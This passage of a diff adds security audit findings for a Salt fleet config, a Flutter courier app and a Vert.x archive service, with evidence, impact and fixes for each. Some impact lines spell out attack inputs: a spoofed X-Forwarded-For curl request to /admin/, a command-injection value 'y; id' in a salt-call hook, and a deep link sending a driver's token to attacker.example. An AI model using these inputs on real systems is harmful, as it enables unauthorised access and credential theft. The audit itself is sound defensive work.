+          "for": "whether other endpoints are also plaintext, to tell a systemic choice from a one-off",
+          "found": "all four other URLs are https; only agent_package_url is http"
+        }
+      ]
+    },
+    {
+      "title": "nginx trusts X-Forwarded-For from any source, defeating the admin CIDR restriction",
+      "location": {
+        "path": "edge-fleet-salt/salt/webproxy/files/nginx.conf.jinja",
+        "symbol": "set_real_ip_from",
+        "line": 7
+      },
+      "cwe": "CWE-290",
+      "class": "authentication bypass by spoofing",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "nginx.conf.jinja:5-7 sets real_ip_header X-Forwarded-For, real_ip_recursive on and set_real_ip_from 0.0.0.0/0 -- every possible peer is declared a trusted proxy, so ngx_http_realip rewrites $remote_addr from a header the client controls. :42-44 then relies on that same $remote_addr: location /admin/ { allow {{ admin_cidr }}; deny all; }. realip runs at the preaccess phase, before the access module evaluates allow/deny, so the spoofed value is what the ACL sees.",
+      "impact": "curl -H 'X-Forwarded-For: 10.42.7.5' https://edge.example/admin/ passes the allow check from anywhere on the internet. This is the only control standing in front of the operator console on this hop, and the PHP tier's own /admin group has no authentication of its own.",
+      "recommendation": "Restrict set_real_ip_from to the regional load balancer addresses, and put authentication in front of /admin rather than an address ACL alone.",
+      "triage": [
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "I am not inventing a bypass of a working mitigation: the allow/deny ACL is genuinely defeated by the realip configuration three directives above it in the same file."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "There is no mitigation to credit -- set_real_ip_from 0.0.0.0/0 is the opposite of a trusted-proxy pin."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "nginx.conf.jinja:5-7 and :42-44 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: the X-Forwarded-For request header, consumed by the realip directive at nginx.conf.jinja:5."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "edge-fleet-salt/salt/webproxy/files/nginx.conf.jinja:5",
+          "edge-fleet-salt/salt/webproxy/files/nginx.conf.jinja:6",
+          "edge-fleet-salt/salt/webproxy/files/nginx.conf.jinja:7",
+          "edge-fleet-salt/salt/webproxy/files/nginx.conf.jinja:43"
+        ],
+        "established_by": "nginx.conf.jinja:7 -- set_real_ip_from 0.0.0.0/0 makes every client a trusted proxy",
+        "narrowed_by": "admin_cidr is rendered from pillar (webproxy/init.sls:27), so the attacker must know or guess the management range -- 10.42.7.0/24 is in the pillar at fleet.sls:28"
+      },
+      "searched": [
+        {
+          "looked_in": "edge-fleet-salt/salt/webproxy/init.sls",
+          "for": "a second layer (auth_basic, mTLS, a firewall state) that would still stand if the ACL is spoofed",
+          "found": "nothing -- the state installs nginx, writes the token file and renders this one config"
+        },
+        {
+          "looked_in": "edge-fleet-salt/salt/webproxy/files/nginx.conf.jinja",
+          "for": "any authentication directive on the /admin/ location",
+          "found": "nothing -- allow/deny and proxy_pass only"
+        }
+      ]
+    },
+    {
+      "title": "Fleet agent token file is written world-readable",
+      "location": {
+        "path": "edge-fleet-salt/salt/webproxy/init.sls",
+        "symbol": "fleet-agent-token",
+        "line": 17
+      },
+      "cwe": "CWE-732",
+      "class": "incorrect permission assignment",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "webproxy/init.sls:10-17 writes /etc/fleet/agent.token with user root, group root and mode '0644'. The comment at :8-9 says the file is 'Shared by the proxy, the metrics shipper and the log tailer, each of which runs under its own service account' -- sharing between three service accounts is a group-readable problem, and 0644 solves it by granting every local uid instead.",
+      "impact": "Any local account on an edge node reads the control-plane bearer token that fleetctl.enroll presents at fleetctl.py:85, and can then enrol or impersonate nodes against the control plane.",
+      "recommendation": "Create a dedicated group holding the three service accounts and write the file 0640 root:that-group.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "An explicitly granted world-read bit on a credential file is a permission defect, not an omitted hardening step."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "webproxy/init.sls:10-17 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The untrusted reader is any local uid on the edge node; the object is the file created at webproxy/init.sls:12."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "edge-fleet-salt/salt/webproxy/init.sls:17"
+        ],
+        "established_by": "webproxy/init.sls:17 -- mode '0644' on a token file",
+        "narrowed_by": "Requires an existing local account on the node"
+      },
+      "searched": [
+        {
+          "looked_in": "edge-fleet-salt/salt/webproxy/init.sls",
+          "for": "a group that would make a restrictive mode workable",
+          "found": "group: root at :16 -- no shared service group is created anywhere in the tree"
+        },
+        {
+          "looked_in": "edge-fleet-salt/salt/_modules/fleetctl.py",
+          "for": "what the token actually authorises, to size the impact",
+          "found": "it is the bearer credential for the control-plane enroll endpoint at :80-87"
+        }
+      ]
+    },
+    {
+      "title": "Passwordless root for every fleetops member on every node, including a contractor account",
+      "location": {
+        "path": "edge-fleet-salt/salt/users/init.sls",
+        "symbol": "fleetops-sudoers",
+        "line": 26
+      },
+      "cwe": "CWE-250",
+      "class": "excessive privilege",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "users/init.sls:22-30 writes /etc/sudoers.d/fleetops containing '%fleetops ALL=(ALL) NOPASSWD: ALL'. The membership list is pillar/fleet.sls:34-37 and includes contractor.nightshift. salt/top.sls:2-3 applies the users state to '*', so this lands on every minion in the fleet. The justification at users/init.sls:20-21 is restarting the proxy and draining a node -- two specific commands, granted as unrestricted root.",
+      "impact": "Every listed account, including the contractor, has unauthenticated root on every node; a single stolen SSH session is a fleet-wide root compromise with no password re-prompt to slow it down.",
+      "recommendation": "Enumerate the commands the rotation actually needs (systemctl restart nginx, the drain binary) in the sudoers entry instead of ALL, and scope the contractor account to the nodes it covers.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is a granted privilege, not an absent hardening measure."
+        },
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No misuse by another component is assumed; the grant is what it is."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "users/init.sls:22-30, pillar/fleet.sls:34-37 and salt/top.sls:2-3 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Not a data-flow finding: the weakness is the standing privilege grant, not tainted input reaching a sink."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "edge-fleet-salt/salt/users/init.sls:26",
+          "edge-fleet-salt/pillar/fleet.sls:37",
+          "edge-fleet-salt/salt/top.sls:3"
+        ],
+        "established_by": "users/init.sls:25-26 -- NOPASSWD: ALL for the whole fleetops group",
+        "narrowed_by": "The attacker needs one of the listed accounts; check_cmd visudo at :30 validates syntax but not scope"
+      },
+      "searched": [
+        {
+          "looked_in": "edge-fleet-salt/salt/top.sls",
+          "for": "whether this state is fleet-wide or role-scoped",
+          "found": "'*' at :2-3, so every minion"
+        },
+        {
+          "looked_in": "edge-fleet-salt/pillar/fleet.sls",
+          "for": "whether the membership list is narrow enough to justify the grant",
+          "found": "three members at :34-37, one of them named contractor.nightshift"
+        }
+      ]
+    },
+    {
+      "title": "Enrollment state passes an operator-supplied hook straight to os.system",
+      "location": {
+        "path": "edge-fleet-salt/salt/_states/enrollment.py",
+        "symbol": "_post_enroll_hook",
+        "line": 22
+      },
+      "cwe": "CWE-78",
+      "class": "command injection",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "enrollment.py:20-22 is return os.system(script + \" \" + node_id) -- both operands concatenated into a shell string. present() reaches it at :40-41 with hook and name taken directly from the state declaration's keyword arguments (:25).",
+      "impact": "Root command execution on the minion for anyone who can author or trigger a state that names this module (salt-call state.single enrollment.present name=x hook='y; id'). The module docstring at :3-5 says nothing in the tree calls it any more, which caps the practical severity at medium -- it remains a synced state module that Salt will happily execute on request.",
+      "recommendation": "Delete the module now that the webproxy and telemetry states enroll directly, or replace os.system with subprocess.run([script, node_id]).",
+      "triage": [
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "I traced it rather than dismissing it for being retired code: it is a state module under salt/_states/, which Salt syncs to minions and exposes by name, so 'nothing calls it' is not the same as 'unreachable'."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Rule 08 keeps a direct injection path in a function's own logic valid even with no caller, which is the basis for reporting it."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "enrollment.py:20-22 and :40-41 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: the hook and name keyword arguments of present() at enrollment.py:25, supplied by whoever writes or triggers the state."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "edge-fleet-salt/salt/_states/enrollment.py:22",
+          "edge-fleet-salt/salt/_states/enrollment.py:41"
+        ],
+        "established_by": "enrollment.py:22 -- os.system on a concatenated string",
+        "narrowed_by": "No in-tree sls declares this state, and the __opts__['test'] branch at :34-37 returns before the hook fires in test mode"
+      },
+      "searched": [
+        {
+          "looked_in": "edge-fleet-salt (grep enrollment.)",
+          "for": "an sls that declares enrollment.present with a hook",
+          "found": "nothing -- the only reference is the module's own docstring and its call to fleetctl.enroll at :29"
+        },
+        {
+          "looked_in": "edge-fleet-salt/salt/top.sls",
+          "for": "a state assignment that would pull this module in",
+          "found": "users, webproxy and telemetry only"
+        }
+      ]
+    },
+    {
+      "title": "Driver session token is injected into whatever page the deep link points at",
+      "location": {
+        "path": "courier_app/lib/screens/proof_webview.dart",
+        "symbol": "_ProofWebViewState._primeSession",
+        "line": 51
+      },
+      "cwe": "CWE-200",
+      "class": "credential exposure to untrusted origin",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "proof_webview.dart:43 loads Uri.parse(widget.proofUrl) with JavaScriptMode.unrestricted (:29) and no onNavigationRequest filter, and :40 fires _primeSession on every page load, which runs \"window.courierSession = {token: '$token', driver: '...'};\" (:50-52) inside that page. proofUrl reaches the widget from the deep link query parameter proof_url (deeplink.dart:40 -> main.dart:57,61) with no host check -- while the same file's followNext (deeplink.dart:34) does check target.host against _trustedHosts, and HelpCenterView in the same file as the sink (proof_webview.dart:86-89) does enforce a host allowlist.",
+      "impact": "Any app on the handset, or any SMS the driver taps, opens courier://proof?proof_url=https://attacker.example/ and receives the driver's live OAuth access token in the page's own JavaScript -- full API impersonation of that driver from the attacker's server.",
+      "recommendation": "Validate proofUrl against the same _trustedHosts set followNext uses before constructing ProofWebView, add an onNavigationRequest allowlist to this controller as HelpCenterView has, and pass the token via an Authorization header on a first-party URL rather than injecting it into page script.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No hypothetical caller: main.dart:61 is the real construction site and it passes the unvalidated parameter."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The host allowlist that exists elsewhere in this codebase is simply not applied on this path -- I am not inventing a bypass of a control that is present here."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "proof_webview.dart:28-53, deeplink.dart:16-40 and main.dart:56-63 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: the deep-link Uri delivered to _handleLink at main.dart:36 (stream subscribed at :33), field proof_url read at deeplink.dart:40."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "courier_app/lib/screens/proof_webview.dart:50",
+          "courier_app/lib/screens/proof_webview.dart:43",
+          "courier_app/lib/main.dart:61",
+          "courier_app/lib/screens/delivery_detail.dart:56",
+          "courier_app/lib/util/deeplink.dart:40"
+        ],
+        "established_by": "proof_webview.dart:48-52 -- the token is written into the loaded page's JS context on every onPageFinished",
+        "narrowed_by": "DeepLink.parse (deeplink.dart:17) requires either the courier scheme or a trusted https host; the courier:// scheme branch imposes no host constraint at all, so any local app satisfies it"
+      },
+      "searched": [
+        {
+          "looked_in": "courier_app/lib/util/deeplink.dart",
+          "for": "validation of proof_url comparable to the followNext host check",
+          "found": "none -- proofUrl at :40 is a bare params lookup, whereas followNext at :34 checks _trustedHosts.contains(target.host)"
+        },
+        {
+          "looked_in": "courier_app/lib/screens/proof_webview.dart",
+          "for": "a navigation allowlist on this controller",
+          "found": "none on ProofWebView; HelpCenterView at :86-89 has exactly the check that is missing"
+        },
+        {
+          "looked_in": "courier_app/android/app/src/main/AndroidManifest.xml",
+          "for": "whether the deep link is actually externally reachable",
+          "found": "yes -- exported MainActivity (:16) with a BROWSABLE courier scheme filter (:33-38)"
+        }
+      ]
+    },
+    {
+      "title": "CourierShell JavaScript channel is exposed to arbitrary remote pages",
+      "location": {
+        "path": "courier_app/lib/screens/proof_webview.dart",
+        "symbol": "_ProofWebViewState.initState",
+        "line": 31
+      },
+      "cwe": "CWE-749",
+      "class": "exposed dangerous method",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "proof_webview.dart:30-37 registers the CourierShell channel on a controller that loads an unvalidated remote URL (:43); any page in that WebView calls CourierShell.postMessage('done') and the handler pops the route with true (:33-34). delivery_detail.dart:60-63 acts on that value: if (done == true) it POSTs /v1/deliveries/{id}/complete with the driver's credentials.",
+      "impact": "An attacker-controlled proof page marks a delivery complete without a signature ever being captured -- forged proof of delivery attributed to the driver, and the audit trail records the driver's own token as the actor.",
+      "recommendation": "Register the channel only for allowlisted first-party origins, and confirm completion against a server-side signature record rather than a message from the page.",
+      "triage": [
+        {
+          "rule": "FP-01",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "delivery_detail.dart:60-63 is the real consumer of the popped value; the abuse needs no hypothetical caller."
+        },
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "This is an exposed native capability, not a missing hardening header."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "proof_webview.dart:30-37 and delivery_detail.dart:54-64 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: the postMessage payload from the loaded page, received at proof_webview.dart:32."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "courier_app/lib/screens/proof_webview.dart:31",
+          "courier_app/lib/screens/delivery_detail.dart:60"
+        ],
+        "established_by": "proof_webview.dart:30-37 -- addJavaScriptChannel on a controller with no origin restriction",
+        "narrowed_by": "The pop value only matters on the delivery_detail path (:54-64); the main.dart:61 route discards it"
+      },
+      "searched": [
+        {
+          "looked_in": "courier_app/lib (grep CourierShell)",
+          "for": "an origin check before handling the message",
+          "found": "nothing -- the handler at :32-36 inspects only the message string"
+        },
+        {
+          "looked_in": "courier_app/lib/screens/delivery_detail.dart",
+          "for": "a server-side confirmation that would make a forged 'done' harmless",
+          "found": "none -- :61 posts completion directly on the popped boolean"
+        }
+      ]
+    },
+    {
+      "title": "TLS certificate validation is disabled by default in every build",
+      "location": {
+        "path": "courier_app/lib/api/client.dart",
+        "symbol": "ApiClient._http",
+        "line": 44
+      },
+      "cwe": "CWE-295",
+      "class": "improper certificate validation",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "client.dart:18-21 declares allowDepotCertificates via bool.fromEnvironment with defaultValue: true, and :43-45 uses it to install httpClient.badCertificateCallback = (cert, host, port) => true -- accept every certificate, for every host, unconditionally. A release build that does not explicitly pass --dart-define=COURIER_ALLOW_DEPOT_CERTS=false ships with verification off. The stated reason (:16-17) is depot staging rigs with an internally issued CA, which a CA pin would solve without disabling the check globally.",
+      "impact": "Anyone on the same network as a driver -- a depot Wi-Fi, a hotspot at a delivery point -- intercepts every request with a self-signed certificate and reads or rewrites the bearer token, the manifest and the completion calls.",
+      "recommendation": "Flip the default to false, and for the depot rigs load the internal CA into a SecurityContext rather than accepting all certificates.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Turning validation off is an active weakening, not an omitted extra."
+        },
+        {
+          "rule": "FP-06",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "The flag is named for staging but its default reaches production builds, which is exactly the reachability question rule 06 asks me to trace rather than assume."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "client.dart:16-21 and :43-45 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress: the TLS peer certificate presented on the connection, accepted at client.dart:44."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "courier_app/lib/api/client.dart:44",
+          "courier_app/lib/api/client.dart:20"
+        ],
+        "established_by": "client.dart:20 -- defaultValue: true on the flag that gates the callback",
+        "narrowed_by": "A build that passes --dart-define=COURIER_ALLOW_DEPOT_CERTS=false is unaffected; nothing in this tree does"
+      },
+      "searched": [
+        {
+          "looked_in": "courier_app (grep COURIER_ALLOW_DEPOT_CERTS)",
+          "for": "a build script, CI config or flavour that sets it false for release",
+          "found": "nothing -- the only occurrence is the declaration at client.dart:19"
+        },
+        {
+          "looked_in": "courier_app/lib/api/client.dart",
+          "for": "a certificate pin or SecurityContext that would make the blanket accept narrower",
+          "found": "nothing -- the HttpClient at :39-41 sets only a timeout and a user agent"
+        }
+      ]
+    },
+    {
+      "title": "API base URL defaults to plain HTTP and the manifest permits cleartext traffic",
+      "location": {
+        "path": "courier_app/lib/api/client.dart",
+        "symbol": "AppConfig.baseUrl",
+        "line": 13
+      },
+      "cwe": "CWE-319",
+      "class": "cleartext transmission",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "client.dart:11-14 defaults COURIER_API_BASE to 'http://api.courier.example', and AndroidManifest.xml:12 sets android:usesCleartextTraffic=\"true\", which removes the platform default that would otherwise block the plaintext request. _headers() at :51-58 attaches 'Authorization': 'Bearer $token' to every one of those requests.",
+      "impact": "The driver's bearer token, delivery addresses and recipient names traverse the network in the clear on any build that does not override the define -- readable and modifiable by anyone on the path.",
+      "recommendation": "Default baseUrl to https, and remove usesCleartextTraffic (or narrow it to the depot hostnames with a network security config).",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "usesCleartextTraffic=true is an explicit opt-out of a platform protection, not a missing header."
+        },
+        {
+          "rule": "FP-09",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "There is no mitigating control: the manifest flag removes the one the platform would have applied."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "client.dart:11-14, :56 and AndroidManifest.xml:12 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Not tainted-input-to-sink: the weakness is the transport of the app's own secret."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "courier_app/lib/api/client.dart:13",
+          "courier_app/android/app/src/main/AndroidManifest.xml:12",
+          "courier_app/lib/api/client.dart:56"
+        ],
+        "established_by": "client.dart:13 -- an http:// default that AndroidManifest.xml:12 makes deliverable",
+        "narrowed_by": "A build passing --dart-define=COURIER_API_BASE=https://... overrides the scheme; the manifest flag still permits cleartext to any other host"
+      },
+      "searched": [
+        {
+          "looked_in": "courier_app (grep COURIER_API_BASE)",
+          "for": "a build configuration that supplies an https base",
+          "found": "nothing -- only the declaration at client.dart:11"
+        },
+        {
+          "looked_in": "courier_app/android/app/src/main/AndroidManifest.xml",
+          "for": "a networkSecurityConfig that would scope the cleartext exception",
+          "found": "nothing -- the attribute is a blanket true at :12"
+        }
+      ]
+    },
+    {
+      "title": "Access and refresh tokens are stored in SharedPreferences while secure storage is used only for the PIN",
+      "location": {
+        "path": "courier_app/lib/api/session.dart",
+        "symbol": "Session.saveTokens",
+        "line": 38
+      },
+      "cwe": "CWE-312",
+      "class": "cleartext storage of sensitive information",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "session.dart:37-41 writes the access token, refresh token and driver id with _prefs.setString -- SharedPreferences, a plaintext XML file in the app sandbox. The class already holds a FlutterSecureStorage instance (:19, :23) and uses it for the PIN at :46 and :72, so the secure sink is present and deliberately not used for the tokens.",
+      "impact": "Any path that reads the app's data directory -- a rooted or ADB-backup-enabled handset, a device-level compromise, some OEM backup agents -- recovers a live refresh token and holds durable API access as that driver.",
+      "recommendation": "Move kAccessToken and kRefreshToken to _secure, which the class already constructs.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Not defense-in-depth theatre: the intended secure sink is instantiated in the same class and used for a less sensitive value."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Reading app-private prefs is a routine, repeatable step once the device is rooted or backups are enabled -- no fragile timing involved."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "session.dart:18-24, :37-41 and :44-47 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Not a tainted-input finding: the weakness is where the app's own secret is placed."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "courier_app/lib/api/session.dart:38",
+          "courier_app/lib/api/session.dart:39",
+          "courier_app/lib/api/session.dart:40"
+        ],
+        "established_by": "session.dart:37-41 -- setString on _prefs for the token pair",
+        "narrowed_by": "Requires local access to the app sandbox; on a non-rooted device with backups disabled the exposure is much smaller"
+      },
+      "searched": [
+        {
+          "looked_in": "courier_app/lib/api/session.dart",
+          "for": "whether the secure store is genuinely available on this path",
+          "found": "yes -- _secure is constructed at :23 and used at :46, :50 and :72"
+        },
+        {
+          "looked_in": "courier_app/pubspec.yaml",
+          "for": "confirmation that flutter_secure_storage is a real dependency and not aspirational",
+          "found": "flutter_secure_storage: ^9.2.2 at :14"
+        }
+      ]
+    },
+    {
+      "title": "SecureBox seals every value with a fixed all-zero IV in CBC mode",
+      "location": {
+        "path": "courier_app/lib/util/crypto.dart",
+        "symbol": "SecureBox._iv",
+        "line": 26
+      },
+      "cwe": "CWE-329",
+      "class": "predictable initialization vector",
+      "severity": "medium",
+      "status": "confirmed",
+      "evidence": "crypto.dart:26 is static final enc.IV _iv = enc.IV.fromLength(16); -- sixteen zero bytes, shared by seal (:28-31) and open (:33-36), both AES-CBC. The comment at :24-25 explains the choice: a value sealed by one build must open in the next. The key compounds it: :19-22 derives it as sha256('courier-app-v3:' + installationId) from a constant and the installation id, which session.dart:26 reads out of plaintext SharedPreferences.",
+      "impact": "Identical PINs seal to identical ciphertext, so the stored blob is a direct equality oracle across devices and builds; and because the key inputs are both recoverable from the device, an attacker with the prefs file derives the key and decrypts the PIN outright. CBC without a MAC is also malleable, so the stored value can be tampered rather than merely read.",
+      "recommendation": "Generate a random IV per seal and store it with the ciphertext, move to an authenticated mode (AES-GCM), and derive the key from material held in the platform keystore rather than from a value kept in SharedPreferences.",
+      "triage": [
+        {
+          "rule": "FP-04",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Rule 04 credits standard safe library use; a fixed zero IV in CBC is a named cryptographic defect, not missing paranoia around a safe default."
+        },
+        {
+          "rule": "FP-08",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Rule 08 treats a fundamentally broken cryptographic construction as valid on its own terms, which is the basis for reporting it."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "crypto.dart:17-36 and session.dart:26, :44-53 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Not a tainted-input path: the weakness is in the construction protecting the app's own secret."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "courier_app/lib/util/crypto.dart:26",
+          "courier_app/lib/util/crypto.dart:20",
+          "courier_app/lib/api/session.dart:45",
+          "courier_app/lib/api/session.dart:52"
+        ],
+        "established_by": "crypto.dart:26 -- a single static zero IV reused for every seal and open",
+        "narrowed_by": "The sealed blob itself does live in FlutterSecureStorage (session.dart:46), so an attacker needs the secure store as well as the prefs"
+      },
+      "searched": [
+        {
+          "looked_in": "courier_app/lib/util/crypto.dart",
+          "for": "a random IV path or an authenticated mode used anywhere else in the file",
+          "found": "nothing -- one _iv at :26 and AESMode.cbc at both :29 and :34"
+        },
+        {
+          "looked_in": "courier_app/lib/api/session.dart",
+          "for": "whether the key input is secret",
+          "found": "it is not -- installationId at :26 is read from SharedPreferences, the same plaintext store the tokens sit in"
+        }
+      ]
+    },
+    {
+      "title": "API response bodies are written to the device log on every GET",
+      "location": {
+        "path": "courier_app/lib/api/client.dart",
+        "symbol": "ApiClient.get",
+        "line": 66
+      },
+      "cwe": "CWE-532",
+      "class": "sensitive data in logs",
+      "severity": "low",
+      "status": "confirmed",
+      "evidence": "client.dart:66 debugPrint('GET $path -> ${response.statusCode} ${response.body}') logs the entire response body. debugPrint is not compiled out of release builds, so this runs in production; the bodies carry recipient names and delivery addresses (delivery_detail.dart:78-82 renders exactly those fields). The post() method twenty lines below has no equivalent line.",
+      "impact": "Recipient names and addresses land in the device log. Modern Android restricts logcat to privileged readers, so the realistic reader is a device-level compromise, a bug-report capture, or an OEM logging agent -- which is why this is low rather than a live data-exposure path.",
+      "recommendation": "Wrap the call in an assert or a kDebugMode guard, or log the status code without the body.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "An actively emitted PII record is a disclosure, not an absent hardening step."
+        },
+        {
+          "rule": "FP-03",
+          "answer": "UNKNOWN",
+          "reason": "Reading the log requires a privileged reader on modern Android; I could not establish an unprivileged path, which is the reason for the low severity rather than a higher one."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "client.dart:60-72 re-read verbatim."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "NOT_APPLICABLE",
+          "reason": "Not a tainted-input path: the data flows outward from the app to a lower-trust sink."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "courier_app/lib/api/client.dart:66"
+        ],
+        "established_by": "client.dart:66 -- response.body interpolated into a debugPrint",
+        "narrowed_by": "Only the GET path logs bodies; post() at :74-85 does not"
+      },
+      "searched": [
+        {
+          "looked_in": "courier_app/lib (grep debugPrint)",
+          "for": "other logging sites or a release-mode guard",
+          "found": "one occurrence, client.dart:66, with no kDebugMode or assert guard around it"
+        },
+        {
+          "looked_in": "courier_app/lib/screens/delivery_detail.dart",
+          "for": "whether the logged payload actually contains personal data",
+          "found": "yes -- recipient and address are rendered from the same record at :78 and :80"
+        }
+      ]
+    },
+    {
+      "title": "Blob and preset routes are registered on the root router before the /v1* auth subrouter",
+      "location": {
+        "path": "archive-vault-vertx/src/main/java/vault/MainVerticle.java",
+        "symbol": "MainVerticle.bootstrap",
+        "line": 70
+      },
+      "cwe": "CWE-306",
+      "class": "missing authentication",
+      "severity": "high",
+      "status": "confirmed",
+      "evidence": "MainVerticle.java:70-71 register root.get(\"/v1/blobs\") and root.get(\"/v1/presets/:name\") directly on the root router. The authenticated router is built afterwards: api.route().handler(tokens::handle) at :74 and root.route(\"/v1*\").subRouter(api) at :80. Vert.x matches routes in registration order, and downloadBlob (:105-120) terminates the response with end(buffer) without calling ctx.next(), so tokens::handle never runs for those paths. The comment at :68-69 gives the reason: the viewer pulls blob bodies into <img> and <object> tags that cannot carry an Authorization header. INGRESS: ctx.queryParams().get(\"key\") at MainVerticle.java:106.",
+      "impact": "Every archived document body is retrievable with no token by anyone who knows or guesses a blob key, and downloadBlob never consults ownerId even though every metadata handler does. It also makes the BlobStore traversal reachable pre-authentication, which turns it into a path to /etc/vault/jwks.json (config.json:26) -- the HMAC secret TokenVerifier checks every token against.",
+      "recommendation": "Move both routes inside the authenticated subrouter and give the viewer short-lived signed per-blob capability URLs instead of dropping authentication for the endpoint.",
+      "triage": [
+        {
+          "rule": "FP-02",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Authentication is entirely absent on a data-serving route, not merely thin."
+        },
+        {
+          "rule": "FP-05",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "No mitigation is being bypassed -- the handler is never reached by the auth handler at all."
+        },
+        {
+          "rule": "FP-12",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Supervisor re-read MainVerticle.java:61-80 and :105-120 independently of the researcher; the registration order is exactly as claimed."
+        },
+        {
+          "rule": "FP-13",
+          "answer": "DOES_NOT_HOLD",
+          "reason": "Ingress cited at MainVerticle.java:106."
+        }
+      ],
+      "scope": {
+        "applies_to": [
+          "archive-vault-vertx/src/main/java/vault/MainVerticle.java:70",
+          "archive-vault-vertx/src/main/java/vault/MainVerticle.java:71",
+          "archive-vault-vertx/src/main/java/vault/MainVerticle.java:80"
+        ],
+        "established_by": "MainVerticle.java:70-71 -- exact-path routes added to root before the /v1* mount at :80",
+        "narrowed_by": "/healthz (:65) and /v1/health/config (:66) are also pre-auth but expose only build, region and a docs URL (config.json:29-33)"
+      },
+      "searched": [
+        {
+          "looked_in": "archive-vault-vertx/src/main/java/vault/MainVerticle.java",
+          "for": "a second auth handler on the root router that would cover these paths",
+          "found": "nothing -- root.route() carries only BodyHandler at :62; tokens::handle appears once, on the api subrouter at :74"
+        },
+        {
+          "looked_in": "archive-vault-vertx (grep TokenVerifier / tokens::handle)",
+          "for": "any other wiring of the verifier",
+          "found": "instantiated once at :57, referenced as a handler once at :74"
+        },
+        {
+          "looked_in": "corpus-v12 siblings (grep for archive-vault / port 8087)",
